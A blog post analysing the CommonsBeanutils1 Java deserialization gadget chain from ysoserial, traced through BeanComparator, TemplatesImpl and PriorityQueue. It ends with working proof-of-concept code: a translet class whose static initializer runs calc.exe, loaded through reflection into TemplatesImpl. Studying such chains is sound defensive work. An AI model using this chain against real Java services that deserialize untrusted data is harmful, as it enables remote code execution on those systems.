---
title: "[Java Deserialization] CommonsBeanutils1 exploit chain analysis"
date: 2022-01-19T18:17:00+07:00
draft: false
categories: [
    "Offensive Security",
]
tags: [
    "Java","Code"
]
---
Vulnerabilities related to deserialization in Java have become a hot security topic in recent years. An unsafe deserialization process can lead to serious vulnerabilities such as remote code execution. Ysoserial is a project created by frohoff, one of the people who discovered deserialization vulnerabilities in Java. This post will analyze the CommonsBeanutils1 chain

Apache Commons Beanutils is another project in the Apache Commons toolkit that provides some methods for manipulating ordinary Java class objects (also known as JavaBeans).

### Gadget chain
```
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    BeanComparator.compare()
                        TemplatesImpl.getOutputProperties()
                            TemplatesImpl.newTransformer()
                                TemplatesImpl.getTransletInstance()
                                    TemplatesImpl.defineTransletClasses()
                                        TemplatesImpl.TransletClassLoader.defineClass()
                                            Pwner*(Javassist-generated).<static init>
                                                Runtime.exec()
```
### Analysis
For example, here's the simplest JavaBean class

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg)

Commons-beanutils provides a static method PropertyUtils.getProperty that lets the user directly call the getter method of any JavaBean, such as:

```
PropertyUtils.getProperty (Object bean, String name)
```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg)

At this point, commons-beanutils will automatically find the getter method of the name property, i.e. getName, then call it to get the return value. This way, the user can easily call the getter of any object.

In the compare method of the BeanComparator class, there's a call to the PropertyUtils.getProperty function, implemented as follows:

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg)

This method takes in 2 objects. If this.property is null, it compares the two objects directly with each other; otherwise, if this.property is not null, it uses PropertyUtils.getProperty to get the property value of the two objects and compares them with each other. As mentioned above, PropertyUtils.getProperty will automatically call the getter method of the JavaBean, and this is the key to executing arbitrary code. 

So is there any getter method that can execute arbitrary code?

**TemplatesImpl chain**

```
TemplatesImpl#getOutputProperties ->
TemplatesImpl#newTransformer() ->
TemplatesImpl#getTransletInstance() -> 
TemplatesImpl#defineTransletClasses()-> 
TransletClassLoader#defineClass()
```

This chain was found earlier. PropertyUtils.getProperty(o1, property) : when o1 passed in is a TemplatesImpl object and property has the value outputProperties, the getter method will be called automatically to execute the TemplatesImpl#getOutputProperties() method. Internally, TemplatesImpl#getOutputProperties() in turn calls newTransformer()

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg)

And TemplatesImpl#newTransformer() is commonly used to execute malicious bytecodes:

```
TemplatesImpl#newTransformer() ->
```
![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg)

TemplatesImpl#getTransletInstance() -> 

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg)

TemplatesImpl#defineTransletClasses()-> 

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg)

TransletClassLoader#defineClass()

Building TemplatesImpl

```
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates,"_name", "Pwnr");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
setFieldValue(templates,"_bytecodes",new byte[][]{malicious_bytes});
PropertyUtils.getProperty(templates,"outputProperties");
```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg)

And then pass the TemplatesImpl object just created into BeanComparator

```
BeanComparator beanComparator = new BeanComparator("outputProperties");
```

**PriorityQueue**

ReadObject in PriorityQueue calls the heapify function to sort the elements, then triggers the comparator.compare method, forming a perfect chain. There are probably other ways to trigger comparator.compare, but in this gadget chain the author used this approach. The more I analyze it, the more I admire the people who came before, who could find something like this.

```
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg)

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg)

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg)

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg)

The complete chain:

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg)

Perfect!

Reference code:

**RunCmd.class**
```
package com.summer.cb1;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class RunCmd extends AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd","/c","calc.exe"});
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

**TempletesTest class**
```
package com.summer.cb1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.PropertyUtils;
import org.junit.Test;

import java.lang.reflect.Field;

public class TempletesTest {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] classToBytes() throws Exception{
        byte[] bytes = ClassPool.getDefault().get(RunCmd.class.getName()).toBytecode();
        return bytes;
    }

    @Test
    public void test() throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name", "Pwnr");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{classToBytes()});
        PropertyUtils.getProperty(templates,"outputProperties");
    }

    
}

```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg)

What I learned: 

- Research skills and problem analysis
- Learned a lot about java and analyzing gadget chains in java deserialization.

On the first day I sat reading and understood nothing. On day 2 I started getting into the analysis, found it really interesting and a lot of things clicked. I'll analyze other gadget chains or some CVE about java deserialization in the near future.

References (to understand it, who knows how many more articles by the Chinese wizards I had to read!)

Thanks for reading this far!


